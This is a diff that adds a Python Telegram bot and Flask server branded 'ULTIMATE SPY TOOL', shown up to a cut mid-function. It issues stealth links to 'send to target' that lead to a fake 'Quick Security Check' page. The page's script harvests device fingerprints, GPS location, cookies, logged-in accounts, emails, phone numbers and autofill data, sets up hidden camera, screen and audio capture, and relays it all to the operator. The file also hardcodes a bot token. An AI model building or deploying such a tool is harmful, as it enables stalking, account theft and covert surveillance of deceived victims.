@@ -1,0 +1,1605 @@
+import secrets
+import sqlite3
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
+import asyncio
+from threading import Thread
+from flask import Flask, render_template_string, request, jsonify
+import requests
+import time
+import logging
+import base64
+from io import BytesIO
+import json
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# ============ CONFIGURATION ============
+BOT_TOKEN = "8280485894:AAHn1urVFeVA2-NFlltG0-fTyicJ4oTry1k"
+localXpose = "irxq7vpftn.loclx.io"
+
+# ============ FLASK APP ============
+app = Flask(__name__)
+
+# ============ DATABASE SETUP ============
+def init_db():
+    conn = sqlite3.connect('device_tracker.db', check_same_thread=False)
+    c = conn.cursor()
+    
+    c.execute('''CREATE TABLE IF NOT EXISTS links
+                 (id TEXT PRIMARY KEY,
+                  user_id INTEGER,
+                  created_at TEXT,
+                  clicks INTEGER DEFAULT 0,
+                  active INTEGER DEFAULT 1)''')
+    
+    c.execute('''CREATE TABLE IF NOT EXISTS devices
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  link_id TEXT,
+                  user_id INTEGER,
+                  ip TEXT,
+                  user_agent TEXT,
+                  device_type TEXT,
+                  os TEXT,
+                  os_version TEXT,
+                  device_manufacturer TEXT,
+                  device_model TEXT,
+                  browser TEXT,
+                  browser_version TEXT,
+                  screen_resolution TEXT,
+                  language TEXT,
+                  timezone TEXT,
+                  location TEXT,
+                  isp TEXT,
+                  latitude TEXT,
+                  longitude TEXT,
+                  platform TEXT,
+                  cpu_cores TEXT,
+                  touch_support TEXT,
+                  battery TEXT,
+                  timestamp TEXT,
+                  canvas_fingerprint TEXT,
+                  webgl_vendor TEXT,
+                  webgl_renderer TEXT,
+                  front_camera_photo BLOB,
+                  back_camera_photo BLOB,
+                  screenshot BLOB,
+                  audio_recording BLOB,
+                  cookies TEXT,
+                  logged_accounts TEXT,
+                  local_storage TEXT,
+                  session_storage TEXT,
+                  installed_fonts TEXT,
+                  zip_code TEXT,
+                  emails TEXT,
+                  phones TEXT,
+                  autofill_data TEXT,
+                  network_info TEXT,
+                  data_capture_status TEXT)''')
+    
+    conn.commit()
+    conn.close()
+
+init_db()
+
+# ============ HELPER FUNCTIONS ============
+def generate_unique_id():
+    return secrets.token_urlsafe(8)
+
+def get_db():
+    return sqlite3.connect('device_tracker.db', check_same_thread=False)
+
+def create_link(user_id):
+    link_id = generate_unique_id()
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("INSERT INTO links (id, user_id, created_at) VALUES (?, ?, ?)",
+              (link_id, user_id, datetime.now().isoformat()))
+    conn.commit()
+    conn.close()
+    return link_id
+
+def get_user_links(user_id):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT id, created_at, clicks FROM links WHERE user_id = ? AND active = 1 ORDER BY created_at DESC", 
+              (user_id,))
+    links = c.fetchall()
+    conn.close()
+    return links
+
+def get_ip_info(ip):
+    """Get detailed location info from IP address"""
+    try:
+        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query', timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('status') == 'success':
+                zip_code = data.get('zip', '')
+                if not zip_code or zip_code == '':
+                    zip_code = 'N/A'
+                
+                return {
+                    'location': f"{data.get('city', 'Unknown')}, {data.get('regionName', 'Unknown')}, {data.get('country', 'Unknown')}",
+                    'isp': data.get('isp', 'Unknown'),
+                    'org': data.get('org', 'Unknown'),
+                    'as': data.get('as', 'Unknown'),
+                    'latitude': str(data.get('lat', 'Unknown')),
+                    'longitude': str(data.get('lon', 'Unknown')),
+                    'timezone': data.get('timezone', 'Unknown'),
+                    'zip': zip_code
+                }
+    except Exception as e:
+        logger.error(f"Error getting IP info: {e}")
+    
+    return {
+        'location': 'Unknown',
+        'isp': 'Unknown',
+        'org': 'Unknown',
+        'as': 'Unknown',
+        'latitude': 'Unknown',
+        'longitude': 'Unknown',
+        'timezone': 'Unknown',
+        'zip': 'N/A'
+    }
+
+# ============ TELEGRAM BOT HANDLERS ============
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    welcome_msg = (
+        "╔═══════════════════════════╗\n"
+        "║  🕵️ ULTIMATE SPY TOOL  🕵️  ║\n"
+        "╚═══════════════════════════╝\n\n"
+        "⚡ <b>STEALTH MODE ACTIVATED</b>\n\n"
+        "🎯 <b>FAST CAPTURE MODE:</b>\n"
+        "├ 📍 <b>Location (Instant)</b>\n"
+        "├ 📱 <b>Device Info (Instant)</b>\n"
+        "├ 🌐 <b>Browser Data (Instant)</b>\n"
+        "├ 📸 <b>Camera (Optional)</b>\n"
+        "├ 🎤 <b>Audio (Optional)</b>\n"
+        "├ 🖥️ <b>Screen (Optional)</b>\n"
+        "├ 🍪 <b>Cookies & Accounts</b>\n"
+        "├ 📧 <b>Email Harvesting</b>\n"
+        "├ 📞 <b>Phone Extraction</b>\n"
+        "└ 📝 <b>Autofill Data</b>\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "⚡ <b>COMPLETES IN 3-5 SECONDS!</b>\n"
+        "Use /generate to create stealth link!"
+    )
+    
+    keyboard = [
+        [InlineKeyboardButton("🔗 Generate Tracking Link", callback_data="generate")],
+        [InlineKeyboardButton("📊 View My Links", callback_data="mylinks")],
+        [InlineKeyboardButton("❓ Help", callback_data="help")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text(welcome_msg, parse_mode="HTML", reply_markup=reply_markup)
+
+async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    link_id = create_link(user_id)
+    tracking_url = f"https://{localXpose}/track/{link_id}"
+    
+    msg = (
+        "╔═══════════════════════════╗\n"
+        "║    ✅ LINK GENERATED!    ║\n"
+        "╚═══════════════════════════╝\n\n"
+        f"🔗 <b>Fast Capture Link:</b>\n"
+        f"<code>{tracking_url}</code>\n\n"
+        "━━━━━━━━══════════════════━\n"
+        "⚡ <b>LIGHTNING FAST:</b>\n\n"
+        "1️⃣ Copy link above\n"
+        "2️⃣ Send to target\n"
+        "3️⃣ Data in 3-5 seconds!\n"
+        "4️⃣ Optional media if allowed\n\n"
+        f"🆔 <b>ID:</b> <code>{link_id}</code>\n"
+        f"📅 <b>Created:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"⚡ <b>Status:</b> ACTIVE\n\n"
+        "━━━━━━━━══════════════════━"
+    )
+    
+    keyboard = [
+        [InlineKeyboardButton("🔗 Generate Another", callback_data="generate")],
+        [InlineKeyboardButton("📊 My Links", callback_data="mylinks")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    if update.callback_query:
+        await update.callback_query.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)
+    else:
+        await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)
+
+async def mylinks(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    links = get_user_links(user_id)
+    
+    if not links:
+        msg = (
+            "╔═══════════════════════════╗\n"
+            "║      📊 YOUR LINKS       ║\n"
+            "╚═══════════════════════════╝\n\n"
+            "❌ No active links found!\n\n"
+            "Use /generate to create your first stealth link! 🔗"
+        )
+        keyboard = [[InlineKeyboardButton("🔗 Generate Link", callback_data="generate")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        if update.callback_query:
+            await update.callback_query.message.reply_text(msg, reply_markup=reply_markup)
+        else:
+            await update.message.reply_text(msg, reply_markup=reply_markup)
+        return
+    
+    msg = (
+        "╔═══════════════════════════╗\n"
+        "║   📊 FAST LINKS          ║\n"
+        "╚═══════════════════════════╝\n\n"
+    )
+    
+    for link_id, created_at, clicks in links[:10]:
+        created_date = datetime.fromisoformat(created_at).strftime('%Y-%m-%d %H:%M')
+        msg += (
+            f"┌─ ⚡ <code>{link_id}</code>\n"
+            f"├─ 📅 {created_date}\n"
+            f"├─ 👁️ Clicks: <b>{clicks}</b>\n"
+            f"└─ 🌐 https://{localXpose}/track/{link_id}\n\n"
+        )
+    
+    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━\n📈 Total: <b>{len(links)}</b> fast links"
+    
+    keyboard = [
+        [InlineKeyboardButton("🔗 Generate New", callback_data="generate")],
+        [InlineKeyboardButton("🔄 Refresh", callback_data="mylinks")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    if update.callback_query:
+        await update.callback_query.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)
+    else:
+        await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    help_msg = (
+        "╔═══════════════════════════╗\n"
+        "║      ❓ HELP CENTER      ║\n"
+        "╚═══════════════════════════╝\n\n"
+        "📱 <b>COMMANDS:</b>\n"
+        "/start - Main menu\n"
+        "/generate - Create fast link\n"
+        "/mylinks - View your links\n"
+        "/help - Show this help\n\n"
+        "━━━━━━━━══════════════════━\n"
+        "⚡ <b>FAST CAPTURE MODE:</b>\n\n"
+        "📍 Location (instant)\n"
+        "📱 Device info (instant)\n"
+        "🌐 Browser data (instant)\n"
+        "🍪 Cookies & accounts (instant)\n"
+        "📧 Emails & phones (instant)\n"
+        "📝 Autofill data (instant)\n"
+        "📸 Camera (optional, fast)\n"
+        "🎤 Audio (optional, fast)\n"
+        "🖥️ Screen (optional, fast)\n\n"
+        "⏱️ <b>Total time: 3-5 seconds!</b>\n\n"
+        "⚠️ Use responsibly & legally!"
+    )
+    
+    keyboard = [[InlineKeyboardButton("🔗 Generate Link", callback_data="generate")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    if update.callback_query:
+        await update.callback_query.message.reply_text(help_msg, parse_mode="HTML", reply_markup=reply_markup)
+    else:
+        await update.message.reply_text(help_msg, parse_mode="HTML", reply_markup=reply_markup)
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == "generate":
+        await generate(update, context)
+    elif query.data == "mylinks":
+        await mylinks(update, context)
+    elif query.data == "help":
+        await help_command(update, context)
+
+async def send_device_notification(bot, user_id, device_data, link_id, front_camera=None, back_camera=None, screenshot=None, audio=None):
+    """Send detailed device info with all media types"""
+    
+    has_gps = device_data.get('gps_latitude', 'N/A') != 'N/A'
+    gps_lat = device_data.get('gps_latitude', 'N/A')
+    gps_lon = device_data.get('gps_longitude', 'N/A')
+    
+    zip_code = device_data.get('zip', 'N/A')
+    
+    # Get data capture status
+    capture_status = device_data.get('data_capture_status', '{}')
+    try:
+        status_dict = json.loads(capture_status)
+    except:
+        status_dict = {}
+    
+    # Build capture status summary
+    status_summary = []
+    if status_dict.get('location', False):
+        status_summary.append("📍 Location")
+    if status_dict.get('device_info', False):
+        status_summary.append("📱 Device Info")
+    if status_dict.get('browser_data', False):
+        status_summary.append("🌐 Browser")
+    if status_dict.get('cookies', False):
+        status_summary.append("🍪 Cookies")
+    if status_dict.get('emails', False):
+        status_summary.append("📧 Emails")
+    if status_dict.get('phones', False):
+        status_summary.append("📞 Phones")
+    if status_dict.get('autofill', False):
+        status_summary.append("📝 Autofill")
+    if status_dict.get('front_camera', False):
+        status_summary.append("📸 Front Camera")
+    if status_dict.get('back_camera', False):
+        status_summary.append("📷 Back Camera")
+    if status_dict.get('screenshot', False):
+        status_summary.append("🖥️ Screenshot")
+    if status_dict.get('audio', False):
+        status_summary.append("🎤 Audio")
+    
+    status_text = " | ".join(status_summary) if status_summary else "❌ No data captured"
+    
+    # Enhanced device information display
+    device_info = (
+        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+        "┃  📱 <b>DEVICE INFORMATION</b>\n"
+        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
+        f"├ 🖥️ Type: <b>{device_data.get('device_type', 'Unknown')}</b>\n"
+    )
+    
+    # Add OS with version if available
+    os_info = device_data.get('os', 'Unknown')
+    os_version = device_data.get('os_version', '')
+    if os_version and os_version != '':
+        os_info += f" {os_version}"
+    device_info += f"├ 💿 OS: <b>{os_info}</b>\n"
+    
+    # Add manufacturer and model if available
+    manufacturer = device_data.get('device_manufacturer', '')
+    model = device_data.get('device_model', '')
+    if manufacturer and manufacturer != '':
+        device_info += f"├ 🏭 Manufacturer: <b>{manufacturer}</b>\n"
+    if model and model != '':
+        device_info += f"├ 📱 Model: <b>{model}</b>\n"
+    
+    device_info += (
+        f"├ 🌐 Browser: <b>{device_data.get('browser', 'Unknown')} {device_data.get('browser_version', '')}</b>\n"
+        f"├ 📺 Screen: <b>{device_data.get('screen_resolution', 'Unknown')}</b>\n"
+        f"├ 🔧 Platform: <b>{device_data.get('platform', 'Unknown')}</b>\n"
+        f"├ ⚙️ CPU: <b>{device_data.get('cpu_cores', 'Unknown')} cores</b>\n"
+        f"├ 👆 Touch: <b>{device_data.get('touch_support', 'No')}</b>\n"
+        f"└ 🔋 Battery: <b>{device_data.get('battery', 'N/A')}</b>\n\n"
+    )
+    
+    # Data capture status section
+    capture_info = (
+        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+        "┃  ⚡ <b>FAST CAPTURE STATUS</b>\n"
+        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
+        f"├ 📈 Captured: <b>{status_text}</b>\n"
+        f"├ ⏱️ Duration: <b>{status_dict.get('duration', 'Unknown')}</b>\n"
+        f"└ 🚨 Page Closed: <b>{'Yes' if status_dict.get('page_closed', False) else 'No'}</b>\n\n"
+    )
+    
+    network_info = (
+        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+        "┃  🌐 <b>NETWORK INTELLIGENCE</b>\n"
+        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
+        f"├ 🌍 IP: <code>{device_data.get('ip', 'Unknown')}</code>\n"
+        f"├ 📍 Location: <b>{device_data.get('location', 'Unknown')}</b>\n"
+        f"├ 📮 ZIP: <b>{zip_code}</b>\n"
+        f"├ 🏢 ISP: <b>{device_data.get('isp', 'Unknown')}</b>\n"
+        f"├ 🏛️ ORG: <b>{device_data.get('org', 'Unknown')}</b>\n"
+        f"└ 🔢 ASN: <code>{device_data.get('as', 'Unknown')}</code>\n\n"
+    )
+    
+    gps_info = ""
+    if has_gps:
+        gps_info = (
+            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+            "┃  📍 <b>GPS COORDINATES</b> (PRECISE!)\n"
+            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
+            f"├ 🧭 Latitude: <code>{gps_lat}</code>\n"
+            f"├ 🧭 Longitude: <code>{gps_lon}</code>\n"
+            f"├ 🎯 Accuracy: <b>{device_data.get('gps_accuracy', 'N/A')}</b>\n"
+            f"└ ✅ Permission: <b>GRANTED</b>\n\n"
+            f"🗺️ <b>Maps:</b> https://maps.google.com/?q={gps_lat},{gps_lon}\n"
+            f"🛰️ <b>Satellite:</b> https://www.google.com/maps/@{gps_lat},{gps_lon},18z/data=!3m1!1e3\n\n"
+        )
+    
+    accounts_info = ""
+    logged_accounts = device_data.get('logged_accounts', {})
+    if logged_accounts and any(logged_accounts.values()):
+        accounts_info = (
+            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+            "┃  👤 <b>LOGGED-IN ACCOUNTS</b> 🔥\n"
+            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
+        )
+        for platform, status in logged_accounts.items():
+            emoji = "✅" if status else "❌"
+            accounts_info += f"├ {emoji} <b>{platform}</b>\n"
+        accounts_info += "\n"
+    
+    emails_info = ""
+    emails = device_data.get('emails', [])
+    if emails and len(emails) > 0:
+        emails_info = (
+            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+            "┃  📧 <b>EMAILS FOUND</b> ({} found)\n"
+            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n".format(len(emails))
+        )
+        for email in emails[:5]:
+            emails_info += f"├ <code>{email}</code>\n"
+        if len(emails) > 5:
+            emails_info += f"└ ... and {len(emails) - 5} more emails\n"
+        emails_info += "\n"
+    
+    phones_info = ""
+    phones = device_data.get('phones', [])
+    if phones and len(phones) > 0:
+        phones_info = (
+            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+            "┃  📞 <b>PHONE NUMBERS</b> ({} found)\n"
+            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n".format(len(phones))
+        )
+        for phone in phones[:5]:
+            phones_info += f"├ <code>{phone}</code>\n"
+        if len(phones) > 5:
+            phones_info += f"└ ... and {len(phones) - 5} more numbers\n"
+        phones_info += "\n"
+    
+    autofill_info = ""
+    autofill_data = device_data.get('autofill_data', {})
+    if autofill_data and any(autofill_data.values()):
+        autofill_info = (
+            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+            "┃  📝 <b>AUTOFILL DATA</b>\n"
+            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
+        )
+        for field, value in autofill_data.items():
+            if value and value != '':
+                autofill_info += f"├ <b>{field.title()}:</b> <code>{value}</code>\n"
+        autofill_info += "\n"
+    
+    cookies_info = ""
+    cookies = device_data.get('cookies', [])
+    if cookies and len(cookies) > 0:
+        cookies_info = (
+            "┏━━━━━━━━━━════════════════════┓\n"
+            "┃  🍪 <b>COOKIES EXTRACTED</b> ({} found)\n"
+            "┗━━━━━━━━━━════════════════════┛\n".format(len(cookies))
+        )
+        for cookie in cookies[:5]:
+            cookies_info += f"├ <code>{cookie.get('name', 'N/A')}</code>: {cookie.get('value', 'N/A')[:30]}...\n"
+        if len(cookies) > 5:
+            cookies_info += f"└ ... and {len(cookies) - 5} more cookies\n"
+        cookies_info += "\n"
+    
+    fingerprint_info = (
+        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+        "┃  🔍 <b>DEVICE FINGERPRINT</b>\n"
+        "┗━━━━━━━━━━━━━━━━══════════════┛\n"
+        f"├ 🎨 Canvas: <code>{device_data.get('canvas_fingerprint', 'N/A')[:20]}...</code>\n"
+        f"├ 🖼️ WebGL Vendor: <b>{device_data.get('webgl_vendor', 'Unknown')}</b>\n"
+        f"├ 🖼️ Renderer: <b>{device_data.get('webgl_renderer', 'Unknown')}</b>\n"
+        f"├ 🌍 Language: <b>{device_data.get('language', 'Unknown')}</b>\n"
+        f"└ ⏰ Timezone: <b>{device_data.get('timezone', 'Unknown')}</b>\n\n"
+    )
+    
+    timestamp_info = (
+        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
+        "┃  🕐 <b>TIMESTAMP</b>\n"
+        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
+        f"├ 📅 Date: <b>{datetime.now().strftime('%B %d, %Y')}</b>\n"
+        f"├ ⏰ Time: <b>{datetime.now().strftime('%H:%M:%S')}</b>\n"
+        f"└ 🔗 Link ID: <code>{link_id}</code>\n\n"
+        "╚═══════════════════════════════════╝\n"
+        "     ✅ <b>FAST INTEL COLLECTED</b>"
+    )
+    
+    msg = (
+        "╔═══════════════════════════════════╗\n"
+        "║  ⚡ TARGET ACQUIRED! ⚡          ║\n"
+        "╚═══════════════════════════════════╝\n\n" +
+        capture_info +
+        device_info +
+        network_info +
+        gps_info +
+        accounts_info +
+        emails_info +
+        phones_info +
+        autofill_info +
+        cookies_info +
+        fingerprint_info +
+        timestamp_info
+    )
+    
+    try:
+        # Send main message first
+        await bot.send_message(chat_id=user_id, text=msg, parse_mode="HTML")
+        
+        # Send front camera photo if available
+        if front_camera and front_camera != 'N/A':
+            try:
+                logger.info("Sending front camera photo...")
+                if isinstance(front_camera, bytes):
+                    photo_file = BytesIO(front_camera)
+                elif isinstance(front_camera, str) and front_camera.startswith('data:image'):
+                    if ',' in front_camera:
+                        base64_data = front_camera.split(',', 1)[1]
+                        photo_bytes = base64.b64decode(base64_data)
+                        photo_file = BytesIO(photo_bytes)
+                    else:
+                        photo_file = None
+                else:
+                    photo_file = None
+                
+                if photo_file:
+                    photo_file.name = 'front_camera.jpg'
+                    await bot.send_photo(
+                        chat_id=user_id,
+                        photo=photo_file,
+                        caption="📸 <b>FRONT CAMERA!</b>",
+                        parse_mode="HTML"
+                    )
+                    logger.info("Front camera photo sent successfully!")
+            except Exception as e:
+                logger.error(f"Error sending front camera photo: {e}")
+        
+        # Send back camera photo if available
+        if back_camera and back_camera != 'N/A':
+            try:
+                logger.info("Sending back camera photo...")
+                if isinstance(back_camera, bytes):
+                    photo_file = BytesIO(back_camera)
+                elif isinstance(back_camera, str) and back_camera.startswith('data:image'):
+                    if ',' in back_camera:
+                        base64_data = back_camera.split(',', 1)[1]
+                        photo_bytes = base64.b64decode(base64_data)
+                        photo_file = BytesIO(photo_bytes)
+                    else:
+                        photo_file = None
+                else:
+                    photo_file = None
+                
+                if photo_file:
+                    photo_file.name = 'back_camera.jpg'
+                    await bot.send_photo(
+                        chat_id=user_id,
+                        photo=photo_file,
+                        caption="📷 <b>BACK CAMERA!</b>",
+                        parse_mode="HTML"
+                    )
+                    logger.info("Back camera photo sent successfully!")
+            except Exception as e:
+                logger.error(f"Error sending back camera photo: {e}")
+        
+        # Send screenshot if available
+        if screenshot and screenshot != 'N/A':
+            try:
+                logger.info("Sending screenshot...")
+                if isinstance(screenshot, bytes):
+                    photo_file = BytesIO(screenshot)
+                elif isinstance(screenshot, str) and screenshot.startswith('data:image'):
+                    if ',' in screenshot:
+                        base64_data = screenshot.split(',', 1)[1]
+                        screenshot_bytes = base64.b64decode(base64_data)
+                        photo_file = BytesIO(screenshot_bytes)
+                    else:
+                        photo_file = None
+                else:
+                    photo_file = None
+                
+                if photo_file:
+                    photo_file.name = 'screenshot.png'
+                    await bot.send_photo(
+                        chat_id=user_id,
+                        photo=photo_file,
+                        caption="🖥️ <b>SCREENSHOT!</b>",
+                        parse_mode="HTML"
+                    )
+                    logger.info("Screenshot sent successfully!")
+            except Exception as e:
+                logger.error(f"Error sending screenshot: {e}")
+        
+        # Send audio recording if available
+        if audio and audio != 'N/A':
+            try:
+                logger.info("Sending audio recording...")
+                if isinstance(audio, bytes):
+                    audio_file = BytesIO(audio)
+                elif isinstance(audio, str) and audio.startswith('data:audio'):
+                    if ',' in audio:
+                        base64_data = audio.split(',', 1)[1]
+                        audio_bytes = base64.b64decode(base64_data)
+                        audio_file = BytesIO(audio_bytes)
+                    else:
+                        audio_file = None
+                else:
+                    audio_file = None
+                
+                if audio_file:
+                    audio_file.name = 'recording.wav'
+                    await bot.send_audio(
+                        chat_id=user_id,
+                        audio=audio_file,
+                        caption="🎤 <b>AUDIO RECORDING!</b>",
+                        parse_mode="HTML"
+                    )
+                    logger.info("Audio recording sent successfully!")
+            except Exception as e:
+                logger.error(f"Error sending audio recording: {e}")
+        
+        logger.info(f"Complete notification sent to user {user_id}")
+    except Exception as e:
+        logger.error(f"Error sending notification: {e}")
+
+telegram_bot = None
+
+# ============ FLASK ROUTES ============
+TRACKING_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Access Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 90%;
+        }
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #667eea;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 22px;
+        }
+        p {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+        .status {
+            margin-top: 15px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            font-size: 13px;
+            color: #555;
+        }
+        #video { display: none; }
+        #canvas { display: none; }
+        #screenshotCanvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <h2>🔐 Quick Security Check</h2>
+        <p>Verifying your access...</p>
+        <div class="status" id="status">Initializing...</div>
+    </div>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <canvas id="screenshotCanvas"></canvas>
+    
+    <script>
+        function updateStatus(text) {
+            document.getElementById('status').textContent = text;
+            console.log('Status:', text);
+        }
+        
+        // Track data collection status
+        let dataCollected = {
+            location: false,
+            device_info: false,
+            browser_data: false,
+            cookies: false,
+            emails: false,
+            phones: false,
+            autofill: false,
+            front_camera: false,
+            back_camera: false,
+            screenshot: false,
+            audio: false,
+            page_closed: false
+        };
+        
+        let startTime = Date.now();
+        let data = {};
+        
+        // Fast data sending
+        function sendData(currentData, isPartial = false) {
+            if (isPartial) {
+                dataCollected.page_closed = true;
+            }
+            
+            const duration = Math.round((Date.now() - startTime) / 1000);
+            
+            currentData.data_capture_status = JSON.stringify({
+                ...dataCollected,
+                duration: duration + 's'
+            });
+            
+            console.log('Sending data...', dataCollected);
+            
+            // Use sendBeacon for partial data (page unload)
+            if (isPartial) {
+                navigator.sendBeacon('/collect/{{ link_id }}', JSON.stringify(currentData));
+            } else {
+                fetch('/collect/{{ link_id }}', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(currentData)
+                }).then(response => {
+                    console.log('Server response:', response.status);
+                    updateStatus('✅ Access granted!');
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 1000);
+                }).catch(error => {
+                    console.error('Error sending data:', error);
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 1000);
+                });
+            }
+        }
+        
+        // Handle page unload
+        window.addEventListener('beforeunload', function() {
+            if (Object.keys(data).length > 0) {
+                navigator.sendBeacon('/collect/{{ link_id }}', JSON.stringify({
+                    ...data,
+                    data_capture_status: JSON.stringify({
+                        ...dataCollected,
+                        page_closed: true,
+                        duration: Math.round((Date.now() - startTime) / 1000) + 's'
+                    })
+                }));
+            }
+        });
+        
+        // Fast device detection
+        function getFastDeviceInfo() {
+            const ua = navigator.userAgent;
+            const deviceInfo = {
+                device_type: 'Desktop',
+                os: 'Unknown',
+                os_version: '',
+                device_manufacturer: '',
+                device_model: '',
+                browser: 'Unknown',
+                browser_version: ''
+            };
+            
+            // Quick device type detection
+            if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
+                deviceInfo.device_type = 'Mobile';
+            } else if (/Tablet|iPad/i.test(ua)) {
+                deviceInfo.device_type = 'Tablet';
+            }
+            
+            // Quick OS detection
+            if (/Windows/i.test(ua)) {
+                deviceInfo.os = 'Windows';
+                deviceInfo.os_version = /Windows NT 10.0/i.test(ua) ? '10/11' : 'Older';
+            } else if (/Mac OS X|Macintosh/i.test(ua)) {
+                deviceInfo.os = 'macOS';
+            } else if (/Android/i.test(ua)) {
+                deviceInfo.os = 'Android';
+                const androidMatch = ua.match(/Android ([0-9.]+)/i);
+                if (androidMatch) deviceInfo.os_version = androidMatch[1];
+                
+                // Quick manufacturer detection
+                if (/SM-/i.test(ua)) {
+                    deviceInfo.device_manufacturer = 'Samsung';
+                } else if (/Pixel/i.test(ua)) {
+                    deviceInfo.device_manufacturer = 'Google';
+                } else if (/MI/i.test(ua)) {
+                    deviceInfo.device_manufacturer = 'Xiaomi';
+                } else if (/vivo/i.test(ua)) {
+                    deviceInfo.device_manufacturer = 'Vivo';
+                } else if (/OPPO/i.test(ua)) {
+                    deviceInfo.device_manufacturer = 'OPPO';
+                } else if (/Huawei/i.test(ua)) {
+                    deviceInfo.device_manufacturer = 'Huawei';
+                }
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                deviceInfo.os = 'iOS';
+                deviceInfo.device_manufacturer = 'Apple';
+                deviceInfo.device_model = /iPhone/i.test(ua) ? 'iPhone' : 'iPad';
+            }
+            
+            // Quick browser detection
+            if (/Edg\/([0-9.]+)/i.test(ua)) {
+                deviceInfo.browser = 'Edge';
+                deviceInfo.browser_version = ua.match(/Edg\/([0-9.]+)/i)[1];
+            } else if (/Chrome\/([0-9.]+)/i.test(ua) && !/Edg/i.test(ua)) {
+                deviceInfo.browser = 'Chrome';
+                deviceInfo.browser_version = ua.match(/Chrome\/([0-9.]+)/i)[1];
+            } else if (/Firefox\/([0-9.]+)/i.test(ua)) {
+                deviceInfo.browser = 'Firefox';
+                deviceInfo.browser_version = ua.match(/Firefox\/([0-9.]+)/i)[1];
+            } else if (/Safari\/([0-9.]+)/i.test(ua) && !/Chrome/i.test(ua)) {
+                deviceInfo.browser = 'Safari';
+                deviceInfo.browser_version = ua.match(/Version\/([0-9.]+)/i)?.[1] || 'Unknown';
+            }
+            
+            return deviceInfo;
+        }
+        
+        // Get location fast
+        function getLocationFast() {
+            return new Promise((resolve) => {
